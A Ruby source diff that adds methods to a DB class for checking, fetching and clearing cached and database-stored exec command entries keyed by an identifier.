@@ -459,6 +459,42 @@ class DB
     return values
   end
 
+  def new_exec?(bid)
+    # check if we have any exec in the cache
+    # probably and old one not yet sent
+    return true if DBCache.new_exec? bid
+    # cannot reach the db, return false
+    return false unless @available
+
+    # retrieve the exec from the db
+    commands = db_rest_call :new_exec, bid
+
+    # put the download in the cache
+    DBCache.save_exec bid, commands unless (commands.nil? or commands.empty?)
+
+    return (commands.nil? or commands.empty?) ? false : true
+  end
+
+  def new_exec(bid)
+    # retrieve the downloads from the cache
+    commands = DBCache.new_exec bid
+
+    return [] if commands.empty?
+
+    down = []
+    # remove the exec from the db
+    commands.each_pair do |key, value|
+      # delete the entry from the db
+      db_rest_call :del_exec, bid, key if @available
+      # return only the filename
+      down << value
+    end
+
+    # delete the download from the cache
+    DBCache.del_exec bid
+
+    return down
+  end
 
   def proxies
     # return empty if not available
